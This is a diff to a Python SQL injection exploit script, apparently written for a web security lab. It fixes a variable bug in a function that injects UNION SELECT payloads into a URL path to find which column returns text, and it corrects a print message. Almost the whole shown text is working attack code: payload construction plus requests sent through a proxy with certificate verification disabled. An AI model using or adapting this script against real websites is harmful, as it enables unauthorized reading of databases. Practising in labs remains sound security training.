@@ -21,8 +21,8 @@ def exploit_sqli_string_field(url, num_col):
     for i in range(1,num_col+1):
         string = "'v2F6UA'"
         payload_list = ['null'] * num_col
-        list[i-1] = string
-        sql_payload = "'+union+select+" + ','.join(list) + "--"
+        payload_list[i-1] = string
+        sql_payload = "' union select " + ','.join(payload_list) + "--"
         r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
         res = r.text
         if string.strip('\'') in res:
@@ -44,7 +44,7 @@ if __name__ == "__main__":
         print("[+] Attempting to find if the types of the columns contain text")
         string_column = exploit_sqli_string_field(url, num_col)
         if string_column:
-            print("[+] The column that contains the text is" + str(string_column))
+            print("[+] The column that contains the text is " + str(string_column))
         else:
             print("[-] Could not find one that has text")
     else:
